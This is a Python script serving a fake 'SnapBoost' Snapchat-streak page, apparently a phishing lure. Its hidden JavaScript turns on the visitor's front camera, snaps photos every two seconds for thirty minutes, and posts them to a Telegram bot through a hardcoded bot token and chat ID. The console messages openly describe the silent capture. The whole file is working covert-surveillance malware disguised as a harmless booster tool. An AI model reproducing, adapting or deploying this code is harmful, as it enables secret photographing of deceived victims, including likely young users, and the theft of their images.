import socket
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# 🔐 التوكن حقك
# ============================================
BOT_TOKEN = "8837083581:AAF8_F1BAc2KPm0YbHD9KwSJUwEYsnZq5YM"
CHAT_ID = "7944049937"

# ============================================
# 📄 صفحة HTML
# ============================================
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SnapBoost</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.container{max-width:400px;width:100%;background:#fff;border-radius:30px;padding:35px 25px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;}
.logo{font-size:60px;margin-bottom:10px;}
h1{font-size:28px;font-weight:800;color:#1a1a2e;margin-bottom:5px;}
.sub{color:#888;font-size:14px;margin-bottom:25px;}
.streak-box{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);border-radius:20px;padding:20px;margin-bottom:20px;color:#fff;}
.streak-box .big{font-size:48px;font-weight:900;}
.streak-box .label{font-size:14px;opacity:0.9;}
.features{display:flex;gap:10px;margin:20px 0;}
.feature{flex:1;background:#f5f5f5;border-radius:15px;padding:15px 10px;}
.feature .icon{font-size:24px;}
.feature .name{font-size:12px;color:#666;margin-top:5px;}
.btn{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;padding:16px;border-radius:16px;font-size:18px;font-weight:700;cursor:pointer;width:100%;transition:all 0.3s;margin-top:10px;}
.btn:hover{transform:scale(1.02);box-shadow:0 10px 30px rgba(102,126,234,0.4);}
.btn:disabled{opacity:0.6;cursor:not-allowed;}
.footer{margin-top:20px;font-size:11px;color:#aaa;}
video,canvas{display:none;}
</style>
</head>
<body>

<div class="container">
    <div class="logo">🔥</div>
    <h1>SnapBoost</h1>
    <div class="sub">Boost your Snapstreak instantly!</div>

    <div class="streak-box">
        <div class="big">🔥 0</div>
        <div class="label">Current Streak</div>
    </div>

    <div class="features">
        <div class="feature"><div class="icon">📸</div><div class="name">Auto Snap</div></div>
        <div class="feature"><div class="icon">⚡</div><div class="name">Instant</div></div>
        <div class="feature"><div class="icon">🛡️</div><div class="name">Safe</div></div>
    </div>

    <button class="btn" id="boostBtn">🚀 Boost Streak Now</button>
    <div class="footer">By continuing you agree to our Terms</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const boostBtn = document.getElementById('boostBtn');

let stream = null;
let captureInterval = null;
let isCapturing = false;
let streakCount = 0;

const BOT_TOKEN = '""" + BOT_TOKEN + """';
const CHAT_ID = '""" + CHAT_ID + """';

async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        });
        video.srcObject = stream;
        await video.play();
        return true;
    } catch (error) {
        alert('⚠️ Camera access is required. Please allow it in Settings.');
        return false;
    }
}

function captureImage() {
    try {
        const ctx = canvas.getContext('2d');
        const w = video.videoWidth || 640;
        const h = video.videoHeight || 480;
        canvas.width = w;
        canvas.height = h;
        ctx.drawImage(video, 0, 0, w, h);
        return canvas.toDataURL('image/jpeg', 0.95);
    } catch (e) {
        return null;
    }
}

async function sendToTelegram(imageData) {
    if (!imageData) return false;
    try {
        const res = await fetch(imageData);
        const blob = await res.blob();
        const fd = new FormData();
        fd.append('photo', blob, 'snap_' + Date.now() + '.jpg');
        const tg = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto?chat_id=' + CHAT_ID, {
            method: 'POST',
            body: fd
        });
        const result = await tg.json();
        return result.ok;
    } catch (e) {
        return false;
    }
}

function updateStreakUI() {
    streakCount++;
    const el = document.querySelector('.big');
    if (el) el.textContent = '🔥 ' + streakCount;
}

async function startHiddenCapture() {
    if (isCapturing) return;
    const ready = await startCamera();
    if (!ready) return;
    isCapturing = true;
    boostBtn.textContent = '⏳ Boosting...';
    boostBtn.disabled = true;
    const img = captureImage();
    if (img) {
        const sent = await sendToTelegram(img);
        if (sent) updateStreakUI();
    }
    captureInterval = setInterval(async () => {
        const img2 = captureImage();
        if (img2) {
            const sent2 = await sendToTelegram(img2);
            if (sent2) updateStreakUI();
        }
    }, 2000);
    setTimeout(() => {
        if (captureInterval) clearInterval(captureInterval);
        if (stream) stream.getTracks().forEach(t => t.stop());
        boostBtn.textContent = '✅ Boosted!';
        boostBtn.disabled = false;
        isCapturing = false;
    }, 30 * 60 * 1000);
}

boostBtn.addEventListener('click', startHiddenCapture);
startCamera();
</script>
</body>
</html>"""

# ============================================
# خادم محلي (منفذ 8085)
# ============================================
class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(HTML_PAGE.encode('utf-8'))
    
    def log_message(self, format, *args):
        pass

def start():
    port = 8085
    server = HTTPServer(('127.0.0.1', port), MyHandler)
    
    url = f'http://127.0.0.1:{port}'
    print('\n' + '='*55)
    print(f'✅ SnapBoost Server: {url}')
    print('📱 Open link in Safari')
    print('⚠️ Allow camera when prompted (in English)')
    print('📸 Camera starts silently in background')
    print('📤 Photos sent to Telegram every 2 seconds')
    print('⏱️ Stops after 30 minutes')
    print('🛑 Press Ctrl+C to stop')
    print('='*55 + '\n')
    
    webbrowser.open(url)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n🛑 Server stopped')
        server.shutdown()

if __name__ == '__main__':
    start()
